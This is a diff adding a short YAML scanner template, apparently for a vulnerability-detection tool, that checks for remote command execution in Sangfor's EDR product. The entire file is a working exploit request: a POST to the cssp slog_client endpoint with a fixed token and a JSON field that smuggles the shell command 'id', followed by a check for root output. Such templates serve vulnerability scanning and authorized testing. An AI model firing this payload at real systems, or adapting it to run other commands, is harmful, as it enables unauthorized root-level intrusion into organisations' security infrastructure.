@@ -1,0 +1,15 @@
+name: 深信服-EDR-cssp-RCE
+description: >-
+  命令执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      {"params":"w=123\"'1234123'\"|id"}
+    expression:
+      status: 200
+      body_all: ["uid=0(root)"]
